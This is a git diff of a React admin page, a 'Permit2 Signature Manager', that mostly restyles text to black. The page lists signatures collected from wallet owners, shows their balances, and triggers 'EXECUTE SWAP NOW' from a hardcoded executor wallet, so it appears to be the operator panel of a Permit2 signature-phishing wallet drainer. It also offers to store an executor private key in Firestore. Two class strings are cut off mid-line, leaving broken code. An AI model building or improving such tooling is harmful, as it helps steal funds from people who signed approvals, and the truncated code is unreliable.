@@ -224,12 +224,12 @@ export default function Admin() {
         <header className="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-40">
           <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
             <div>
-              <h1 className="text-2xl font-bold text-gray-900">Admin Control Center</h1>
-              <p className="text-sm text-gray-500 mt-1">Permit2 Signature Manager</p>
+              <h1 className="text-2xl font-bold text-black">Admin Control Center</h1>
+              <p className="text-sm text-black mt-1">Permit2 Signature Manager</p>
             </div>
             <div className="flex items-center gap-4">
-              <span className="px-4 py-2 text-xs font-semibold text-green-700 bg-green-100 rounded-full">Server Mode • Online</span>
-              <button onClick={openSettings} className="p-2.5 hover:bg-gray-100 rounded-xl transition">
+              <span className="px-4 py-2 text-xs font-semibold text-black bg-green-100 rounded-full">Server Mode • Online</span>
+              <button onClick={openSettings} className="p-2.5 hover:bg-gray-100 rounded-xl transition text-black">
                 Settings Icon
               </button>
             </div>
@@ -239,26 +239,26 @@ export default function Admin() {
         <div className="max-w-7xl mx-auto px-6 py-8 space-y-8">
           {/* Executor Card */}
           <div className="bg-white rounded-2xl shadow-lg border border-gray-200 p-6">
-            <h3 className="text-sm font-semibold text-gray-600 uppercase tracking-wider">Executor Wallet (Hardcoded)</h3>
+            <h3 className="text-sm font-semibold text-black uppercase tracking-wider">Executor Wallet (Hardcoded)</h3>
             <div className="mt-4 flex items-center justify-between">
               <div>
-                <p className="font-mono text-lg">{HARDCODED_EXECUTOR.slice(0, 10)}...{HARDCODED_EXECUTOR.slice(-8)}</p>
+                <p className="font-mono text-lg text-black">{HARDCODED_EXECUTOR.slice(0, 10)}...{HARDCODED_EXECUTOR.slice(-8)}</p>
               </div>
               <div className="text-right">
-                <p className="text-3xl font-bold text-gray-900">{executorEthBalance} ETH</p>
-                <p className="text-xl text-gray-600">{executorTokenBalance} {tokenSymbol}</p>
+                <p className="text-3xl font-bold text-black">{executorEthBalance} ETH</p>
+                <p className="text-xl text-black">{executorTokenBalance} {tokenSymbol}</p>
               </div>
             </div>
           </div>
 
           {/* Output Token */}
           <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
-            <label className="block text-sm font-medium text-gray-700 mb-3">Output Token (Swap Into)</label>
+            <label className="block text-sm font-medium text-black mb-3">Output Token (Swap Into)</label>
             <input
               type="text"
               value={outputToken}
               onChange={(e) => setOutputToken(e.target.value)}
-              className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-gray-800 font-mono"
+              className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition text-black font-mono"
               placeholder="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
             />
           </div>
@@ -267,8 +267,8 @@ export default function Admin() {
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
             {Object.keys(groupedData).length === 0 ? (
               <div className="col-span-full text-center py-24">
-                <div className="text-8xl mb-6">Empty Inbox</div>
-                <p className="text-xl text-gray-500">No signatures collected yet</p>
+                <div className="text-8xl mb-6 text-black">Empty Inbox</div>
+                <p className="text-xl text-black">No signatures collected yet</p>
               </div>
             ) : (
               Object.entries(groupedData).map(([owner, sigs]) => {
@@ -283,37 +283,37 @@ export default function Admin() {
                       <div className="w-12 h-12 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center text-white text-xl font-bold">
                         {owner.slice(2, 4).toUpperCase()}
                       </div>
-                      <span className="text-xs text-gray-500">Click to manage</span>
+                      <span className="text-xs text-black">Click to manage</span>
                     </div>
 
-                    <p className="font-mono text-sm font-semibold text-gray-800 truncate">
+                    <p className="font-mono text-sm font-semibold text-black truncate">
                       {owner.slice(0, 10)}...{owner.slice(-8)}
                     </p>
 
                     <div className="mt-4 space-y-3">
                       <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">ETH</span>
-                        <span className="font-medium">{balances[owner] || '—'}</span>
+                        <span className="text-black">ETH</span>
+                        <span className="font-medium text-black">{balances[owner] || '—'}</span>
                       </div>
                       <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">{tokenSymbol}</span>
-                        <span className="font-medium">{tokenBalances[owner] || '—'}</span>
+                        <span className="text-black">{tokenSymbol}</span>
+                        <span className="font-medium text-black">{tokenBalances[owner] || '—'}</span>
                       </div>
                       <div className="pt-3 border-t border-gray-100">
                         <div className="flex justify-between">
-                          <span className="text-gray-600">Signatures</span>
-                          <span className="font-bold text-indigo-600">{sigs.length}</span>
+                          <span className="text-black">Signatures</span>
+                          <span className="font-bold text-black">{sigs.length}</span>
                         </div>
                         <div className="flex justify-between mt-1">
-                          <span className="text-gray-600">Pending</span>
-                          <span className={`font-bold ${pending > 0 ? 'text-orange-600' : 'text-green-600'}`}>
+                          <span className="text-black">Pending</span>
+                          <span className={`font-bold ${pending > 0 ? '' : ''} text-black`}>
                             {pending}
                           </span>
                         </div>
                       </div>
                     </div>
 
-                    <button className="mt-6 w-full py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-semibold rounded-xl hover:from-indigo-700 hover:to-purple-700 transition shadow-md">
+                    <button className="mt-6 w-full py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-semibold rounded-xl hover:from-indigo-700 hover:to-purple-700 transition shadow-m[...]">
                       Manage Wallet
                     </button>
                   </div>
@@ -328,20 +328,16 @@ export default function Admin() {
           <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsModalOpen(false)}>
             <div className="bg-white rounded-3xl shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto" onClick={e => e.stopPropagation()}>
               <div className="sticky top-0 bg-white border-b border-gray-200 px-8 py-6 flex items-center justify-between">
-                <h2 className="text-2xl font-bold">
+                <h2 className="text-2xl font-bold text-black">
                   {selectedWallet.slice(0, 10)}...{selectedWallet.slice(-8)}
                 </h2>
-                <button onClick={() => setIsModalOpen(false)} className="text-gray-500 hover:text-gray-700">
+                <button onClick={() => setIsModalOpen(false)} className="text-black hover:text-black">
                   Close Icon
                 </button>
               </div>
 
               {statusMsg && (
-                <div className={`mx-8 mt-6 px-6 py-4 rounded-xl text-sm font-medium ${
-                  statusMsg.includes("Success") ? "bg-green-100 text-green-800" :
-                  statusMsg.includes("Error") ? "bg-red-100 text-red-800" :
-                  "bg-blue-100 text-blue-800"
-                }`}>
+                <div className="mx-8 mt-6 px-6 py-4 rounded-xl text-sm font-medium text-black bg-gray-200">
                   {statusMsg}
                 </div>
               )}
@@ -351,18 +347,18 @@ export default function Admin() {
                   <div key={sig.id} className={`p-6 rounded-2xl border-2 ${sig.processed ? 'border-gray-200 bg-gray-50' : 'border-indigo-200 bg-indigo-50/30'}`}>
                     <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
                       <div>
-                        <span className="text-gray-600">Token</span>
-                        <p className="font-mono font-semibold">{sig.token.slice(0, 10)}...{sig.token.slice(-8)}</p>
+                        <span className="text-black">Token</span>
+                        <p className="font-mono font-semibold text-black">{sig.token.slice(0, 10)}...{sig.token.slice(-8)}</p>
                       </div>
                       <div>
-                        <span className="text-gray-600">Amount</span>
-                        <p className="font-semibold">{formatAmount(sig.amount, sig.token)} {sig.token.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7' ? 'USDT' : tokenSymbol}</p>
+                        <span className="text-black">Amount</span>
+                        <p className="font-semibold text-black">{formatAmount(sig.amount, sig.token)} {sig.token.toLowerCase() === '0xdac17f958d2ee523a2206206994597c13d831ec7' ? 'USDT' : tokenSymbol}</p>
                       </div>
                       <div>
-                        <span className="text-gray-600">Status</span>
+                        <span className="text-black">Status</span>
                         <p>
-                          <span className={`inline-block px-4 py-1.5 rounded-full text-xs font-bold ${
-                            sig.processed ? 'bg-green-100 text-green-800' : 'bg-yellow-100 text-yellow-800'
+                          <span className={`inline-block px-4 py-1.5 rounded-full text-xs font-bold text-black ${
+                            sig.processed ? 'bg-green-100' : 'bg-yellow-100'
                           }`}>
                             {sig.processed ? 'Processed' : 'Ready to Execute'}
                           </span>
@@ -371,7 +367,7 @@ export default function Admin() {
                     </div>
 
                     {sig.lastError && !sig.processed && (
-                      <p className="text-red-600 text-xs mt-3 font-medium">Warning: {sig.lastError}</p>
+                      <p className="font-semibold text-black text-xs mt-3 font-medium">Warning: {sig.lastError}</p>
                     )}
 
                     <div className="mt-5">
@@ -379,7 +375,7 @@ export default function Admin() {
                         <button
                           onClick={() => handleExecute(sig)}
                           disabled={processingId === sig.id}
-                          className="w-full py-4 bg-gradient-to-r from-emerald-500 to-teal-600 text-white font-bold rounded-xl hover:from-emerald-600 hover:to-teal-700 disabled:opacity-60 transition text-lg"
+                          className="w-full py-4 bg-gradient-to-r from-emerald-500 to-teal-600 text-white font-bold rounded-xl hover:from-emerald-600 hover:to-teal-700 disabled:opacity-60 transition t[...]
                         >
                           {processingId === sig.id ? "EXECUTING..." : "EXECUTE SWAP NOW"}
                         </button>
@@ -388,7 +384,7 @@ export default function Admin() {
                           href={`https://etherscan.io/tx/${sig.routerTx}`}
                           target="_blank"
                           rel="noreferrer"
-                          className="block text-center py-4 bg-gray-100 text-gray-700 font-semibold rounded-xl hover:bg-gray-200 transition"
+                          className="block text-center py-4 bg-gray-100 text-black font-semibold rounded-xl hover:bg-gray-200 transition"
                         >
                           View on Etherscan ↗
                         </a>
@@ -405,18 +401,18 @@ export default function Admin() {
         {isSettingsOpen && (
           <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4" onClick={() => setIsSettingsOpen(false)}>
             <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8" onClick={e => e.stopPropagation()}>
-              <h2 className="text-2xl font-bold mb-8">Settings</h2>
+              <h2 className="text-2xl font-bold mb-8 text-black">Settings</h2>
               <div className="space-y-6">
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Executor Private Key (Optional)</label>
+                  <label className="block text-sm font-medium text-black mb-2">Executor Private Key (Optional)</label>
                   <input
                     type="password"
                     value={executorPrivateKeySetting}
                     onChange={e => setExecutorPrivateKeySetting(e.target.value)}
-                    className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 outline-none font-mono"
+                    className="w-full px-5 py-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 outline-none font-mono text-black"
                     placeholder="Only for testing • NEVER in production"
                   />
-                  <p className="text-xs text-red-600 mt-3 font-medium">
+                  <p className="text-xs text-black mt-3 font-medium italic">
                     Storing private keys in Firestore is extremely insecure!
                   </p>
                 </div>
@@ -431,12 +427,12 @@ export default function Admin() {
                   </button>
                   <button
                     onClick={() => setIsSettingsOpen(false)}
-                    className="px-8 py-4 border border-gray-300 rounded-xl hover:bg-gray-50 transition font-medium"
+                    className="px-8 py-4 border border-gray-300 rounded-xl hover:bg-gray-50 transition font-medium text-black"
                   >
                     Cancel
                   </button>
                 </div>
-                {settingsStatus && <p className="text-center text-sm text-gray-600">{settingsStatus}</p>}
+                {settingsStatus && <p className="text-center text-sm text-black">{settingsStatus}</p>}
               </div>
             </div>
           </div>
